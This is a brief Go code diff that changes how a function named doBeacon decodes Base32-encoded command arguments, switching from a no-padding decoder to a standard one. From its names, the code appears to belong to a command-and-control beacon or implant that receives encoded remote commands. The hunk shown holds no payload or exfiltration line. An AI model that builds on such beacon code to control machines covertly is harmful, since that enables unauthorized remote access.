@@ -82,7 +82,7 @@ func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command, str
 	var commandArgs []string
 
 	for _, arg := range commandArgsEncoded {
-			decoded, err := encoding.Base32DecodeNoPadding(arg)
+			decoded, err := encoding.Base32Decode(arg)
 			if err != nil {
 					fmt.Println("Error decoding command arg:", err)
 					return
